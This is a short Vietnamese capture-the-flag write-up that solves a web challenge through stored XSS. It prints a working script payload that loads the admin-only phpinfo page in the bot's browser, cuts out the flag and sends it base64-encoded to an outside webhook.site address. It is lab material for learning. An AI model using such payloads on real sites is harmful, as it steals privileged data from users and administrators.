Truy cập vào web ta thấy 2 bài viết Hori trong bộ MiyaHori, hmmm đọc khá là cringe🐧
Quay lại vấn đề chính thì ta tập trung vào 3 phần chính là bot, phpinfo và post.
Vào phần Post ta sẽ nhận thấy ngay đây là 1 dạng XSS (lam roi thi thay ngay🐧)

Mục tiêu: Lấy flag ẩn từ phía admin

Nhận thấy có thể post bài viết có chứa thẻ <script> mà ko bị lọc -> lỗ hổng cần khai thác.

<img width="939" height="425" alt="image" src="https://github.com/user-attachments/assets/3249ec74-1745-4802-a24d-edfeea58ae99" />


Flag được đặt trong 1 biến môi trường hoặc 1 nội dung nhạy cảm của server có thể được hiển thị trong phpinfo. Này chỉ có admin mới đủ đẳng cấp để xem được.

Giờ ta sẽ sử dụng XSS để bypass.

//<script>
  fetch('/phpinfo.php')
    .then(r => r.text())
    .then(c => {
      let i = c.indexOf('KCSC');
      let s = (i !== -1) ? c.substring(Math.max(0, i - 50), i + 250) : 'KCSC_NOT_FOUND';
      // Gửi Base64-encoded string về Webhook
      window.location = 'https://webhook.site/8ea7e50e-e71b-4ce5-85be-fa2cde0491d5?d=' + btoa(s);
    })
    .catch(e => {
      window.location = 'https://webhook.site/8ea7e50e-e71b-4ce5-85be-fa2cde0491d5?error=' + e;
    });
</script>//

Giải thích:
1.fetch('/phpinfo.php'): tự truy cập và tải nội dung của phpinfo.php
2.Tìm kiếm và cắt chuỗi KCSC trong HTML
3. Mã hóa đoạn text vừa cắt sang base64 btoa(s) để đảm bảo không bị lỗi kí tự khi truyền qua url
4. Dùng window.location để chuyển hướng bot sang webhook kèm theo chuỗi base64 vừa mã hõa

Sao chép link bài viết và copy đoạn /view.php?id=c47f73d20499fde9 ( này tự copy của b) và dán vào con bot. Ta sang bên webhook sẽ thấy 1 đoạn base64

<img width="572" height="230" alt="image" src="https://github.com/user-attachments/assets/ab15da2f-7c0a-41c6-8def-f5ed8a1cd4f5" />

Decode và ta có flag

<img width="714" height="494" alt="image" src="https://github.com/user-attachments/assets/206c3f43-a861-4cdb-9256-c46f6d36f252" />

